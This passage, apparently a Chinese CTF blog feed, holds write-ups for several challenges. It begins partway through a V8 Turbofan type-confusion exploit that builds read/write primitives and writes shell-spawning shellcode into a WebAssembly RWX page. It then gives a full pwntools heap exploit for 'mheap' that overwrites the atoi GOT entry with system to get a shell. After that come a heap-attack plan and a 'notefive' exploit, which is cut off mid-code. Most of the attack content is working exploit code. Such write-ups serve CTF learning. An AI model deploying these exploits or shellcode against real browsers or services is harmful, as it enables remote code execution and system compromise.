&#123;<span class="attr">mz</span>:<span class="number">-0</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">0.1</span> , <span class="number">0.2</span> , <span class="number">0.3</span> , <span class="number">0.4</span>];</span><br><span class="line">    <span class="keyword">let</span> b = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x),o.mz);</span><br><span class="line">    arrs.push([<span class="number">0.4</span>,<span class="number">0.5</span>]);</span><br><span class="line">    objs.push(&#123;<span class="attr">mark</span>:<span class="number">0x41414141</span>,<span class="attr">obj</span>:&#123;&#125;&#125;);</span><br><span class="line">    bufs.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x41</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">4</span> ; i&lt; <span class="number">200</span> ;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> len = conv.f2i(a[i*b]);</span><br><span class="line">        <span class="keyword">let</span> is_backing = a[b*(i+<span class="number">1</span>)] === <span class="number">0.4</span>;</span><br><span class="line">        <span class="comment">//console.log(len.toString(16));</span></span><br><span class="line">        <span class="keyword">let</span> good= (len == <span class="number">0x200000000</span>n &amp;&amp; !is_backing);</span><br><span class="line">        <span class="comment">//if(good)</span></span><br><span class="line">        a[b*i*good] = conv.i2f(<span class="number">0x9999999200000000</span>n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">foo(0);</span></span><br><span class="line"><span class="comment">%OptimizeFunctionOnNextCall(foo);</span></span><br><span class="line"><span class="comment">foo("0");</span></span><br><span class="line"><span class="comment">%OptimizeFunctionOnNextCall(foo);</span></span><br><span class="line"><span class="comment">foo(-0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">foo(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i&lt; <span class="number">10000</span> ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"times "</span>+(i+<span class="number">1</span>));</span><br><span class="line">    foo(<span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">-0</span>);</span><br><span class="line"><span class="comment">//%DebugPrint(bufs[2]);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="keyword">let</span> oob;</span><br><span class="line"><span class="keyword">let</span> obj;</span><br><span class="line"><span class="keyword">let</span> buf;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i&lt; arrs.length ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(arrs[i].length != <span class="number">2</span>)&#123;</span><br><span class="line">        oob = arrs[i];</span><br><span class="line">        obj = objs[i];</span><br><span class="line">        buf = bufs[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> offset_obj;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ;i &lt; <span class="number">40</span> ; i++ )&#123;</span><br><span class="line">    <span class="keyword">let</span> temp = conv.f2i(oob[i]);</span><br><span class="line">    <span class="keyword">if</span>(temp == <span class="number">0x4141414100000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        offset_obj = i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj.obj=x;</span><br><span class="line">    <span class="keyword">return</span> conv.f2i(oob[offset_obj]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf_backing_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; <span class="number">50</span> ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> temp = conv.f2i(oob[i]);</span><br><span class="line">    <span class="keyword">if</span>(temp == <span class="number">0x41</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        oob[i]=conv.i2f(<span class="number">0x8</span>);</span><br><span class="line">        buf_backing_offset=i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(buf_backing_offset);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob[buf_backing_offset]=conv.i2f(addr);</span><br><span class="line">    <span class="keyword">let</span> bigint=<span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line">    <span class="keyword">return</span> bigint[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr,x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob[buf_backing_offset] = conv.i2f(addr);</span><br><span class="line">    <span class="keyword">let</span> byte=<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf);</span><br><span class="line">    byte[<span class="number">0</span>]=x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="comment">//%DebugPrint(f);</span></span><br><span class="line"><span class="keyword">let</span> f_addr = addrof(f) - <span class="number">1</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"f_addr ==&gt; 0x"</span>+f_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> share_info_addr = read(f_addr + <span class="number">0x18</span>n) - <span class="number">1</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"share_info ==&gt; 0x"</span>+share_info_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> wasm = read(share_info_addr + <span class="number">8</span>n) - <span class="number">1</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"wasm ==&gt; 0x"</span>+wasm.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> instance=read(wasm+<span class="number">0x10</span>n) <span class="number">-1</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"instance ==&gt; 0x"</span>+instance.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> rwx_addr=read(instance+<span class="number">0xe8</span>n)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"rwx_addr ==&gt; 0x"</span>+rwx_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line">shellcode =[<span class="number">72</span>,<span class="number">49</span>,<span class="number">210</span>,<span class="number">82</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">61</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">87</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">61</span>,<span class="number">37</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">87</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">61</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">87</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">52</span>,<span class="number">36</span>,<span class="number">72</span>,<span class="number">141</span>,<span class="number">61</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">72</span>,<span class="number">199</span>,<span class="number">192</span>,<span class="number">59</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">47</span>,<span class="number">98</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">45</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">68</span>,<span class="number">73</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">76</span>,<span class="number">65</span>,<span class="number">89</span>,<span class="number">61</span>,<span class="number">58</span>,<span class="number">48</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">120</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i&lt; shellcode.length ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    write(rwx_addr+BigInt(i),shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">f();</span><br></pre></td></tr></table></figure></p><p><img src="/2019/09/21/35C3-CTF-2018-Krautflare分析/9.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;一道关于v8 turbofan中typer漏洞的题目.构造起来很困难…&lt;br&gt;漏洞出自: &lt;a href=&quot;https://bugs
      
    
    </summary>
    
    
      <category term="v8_exploit" scheme="http://yoursite.com/tags/v8-exploit/"/>
    
  </entry>
  
  <entry>
    <title>byteCTF&amp;N1CTF部分题解</title>
    <link href="http://yoursite.com/2019/09/11/byteCTF-N1CTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2019/09/11/byteCTF-N1CTF部分题解/</id>
    <published>2019-09-11T03:08:57.000Z</published>
    <updated>2019-09-11T03:48:58.353Z</updated>
    
    <content type="html"><![CDATA[<p>周末两场比赛的一些题解.</p><h3 id="字节跳动CTF"><a href="#字节跳动CTF" class="headerlink" title="字节跳动CTF"></a>字节跳动CTF</h3><h4 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h4><p>赛后总校添师傅跟我说的…<br>漏洞出在 my_read这里，当使用read向一个不合法的地址进行写入的时候会返回-1 …<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">my_read</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= len )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = read(<span class="number">0</span>, (<span class="keyword">void</span> *)(a1 + v3), len - v3);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    v3 += v4;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> __int8 *)(v3 - <span class="number">1L</span>L + a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (_BYTE)result != <span class="number">10</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这样就可以向指针的后面读入…，修改free链.但是这个写入的时候不太好控制，需要多次调试…，劫持free链后，就可以将chunk申请到全局指针这里，然后就可以任意读写了.</p><p>完整的exp如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./mheap"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    set $ptr=0x0000000004040E0</span></span><br><span class="line"><span class="string">    b *0x0000000004011EA</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"Your choice: "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Index: "</span>,str(idx))</span><br><span class="line">    a.sendlineafter(<span class="string">"Input size: "</span>,str(size))</span><br><span class="line">    a.sendafter(<span class="string">"Content: "</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Index: "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Index: "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Index: "</span>,str(idx))</span><br><span class="line">    a.send(content)</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x0000000004040E0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xfe0</span><span class="number">-32</span>,<span class="string">'AAA\n'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">'A'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>,<span class="string">'BABA\n'</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">debug()</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x20</span>)*<span class="number">2</span>+p64(ptr)+<span class="string">'A'</span>*(<span class="number">45</span><span class="number">-8</span><span class="number">-8</span><span class="number">-8</span>+<span class="number">3</span><span class="number">-1</span>)+p64(ptr)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">15</span>,<span class="string">'BBBB\n'</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">atoi_got=elf.got[<span class="string">"atoi"</span>]</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x23330010</span><span class="number">-0x10</span>,p64(atoi_got)*<span class="number">2</span>+<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base=u64(a.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">"atoi"</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">a.sendlineafter(<span class="string">"Index: "</span>,str(<span class="number">2</span>))</span><br><span class="line">a.send(p64(system_addr)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#edit(3,'AAAA\n')</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">a.sendlineafter(<span class="string">"Your choice: "</span>,<span class="string">"/bin/sh\x00\n"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><h4 id="notefive"><a href="#notefive" class="headerlink" title="notefive"></a>notefive</h4><p>这题的难点是chunk的布局,只能申请大于size 0x8f的chunk,只能同时控制5个chunk.唯一的漏洞是读取时有offbyone.</p><p>利用思路如下:</p><ol><li>利用null byte poison 达到chunk overlap.</li><li>部分覆写，利用unsorted bin attack 将global_max_fast修改为&amp;mian_arena+88,这样就可以使用fastbin了.</li><li>free掉一个chunk，由于偏移的问题，chunk会被放入 small bin的位置，这样chunk的fd位置会有libc中的地址，再次利用部分覆写将fd修改到stdout附近.</li><li>修改stdout泄露地址</li><li>利用fastbin attack，将chunk申请到stdout附近，写入合法size，这样不断迭代到__free_hook附近。</li></ol><p>因为我修改malloc_hook为one_gadget不能getshell，所以修改的<strong>free_hook,赛后看别的师傅是修改malloc_hook为realloc+13，修改realloc_hook为one_gadget。<br>这里我修改</strong>free_hook为system不知道为啥会被阻塞，所以最后利用setcontext调用mprotect，写入shellcode来getshell的.</p><h5 id="完整的exp如下"><a href="#完整的exp如下" class="headerlink" title="完整的exp如下:"></a>完整的exp如下:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./note_five"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *($text_base+0x000000000000D45)</span></span><br><span class="line"><span class="string">    b *($text_base+0x000000000000DF3)</span></span><br><span class="line"><span class="string">    b *($text_base+0x000000000000EA9)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"choice&gt;&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"idx: "</span>,str(idx))</span><br><span class="line">    a.sendlineafter(<span class="string">"size: "</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"idx: "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"idx: "</span>,str(idx))</span><br><span class="line">    a.sendafter(<span class="string">": "</span>,content)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x310</span>)</span><br><span class="line">add(<span 